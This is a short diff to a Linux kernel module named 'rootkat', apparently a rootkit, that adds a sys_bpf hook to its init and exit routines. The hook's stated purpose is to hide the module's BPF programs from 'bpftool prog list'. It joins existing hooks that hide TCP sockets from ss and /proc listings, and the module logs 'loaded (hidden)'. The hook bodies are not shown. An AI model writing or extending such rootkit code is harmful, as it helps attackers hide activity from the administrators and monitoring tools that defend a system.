@@ -10,6 +10,7 @@
 #include "hook_tcp4_seq_show.h"
 #include "hook_tcp6_seq_show.h"
 #include "hook_inet_sk_diag_fill.h"
+#include "hook_sys_bpf.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
@@ -73,12 +74,19 @@ static int __init rootkat_init(void)
 		pr_warn(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
 		        rc);
 
+	/* Non-fatal: BPF prog self-hide. */
+	rc = rootkat_hook_sys_bpf_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
+		        rc);
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_sys_bpf_remove();
 	rootkat_hook_inet_sk_diag_fill_remove();
 	rootkat_hook_tcp6_seq_show_remove();
 	rootkat_hook_tcp4_seq_show_remove();
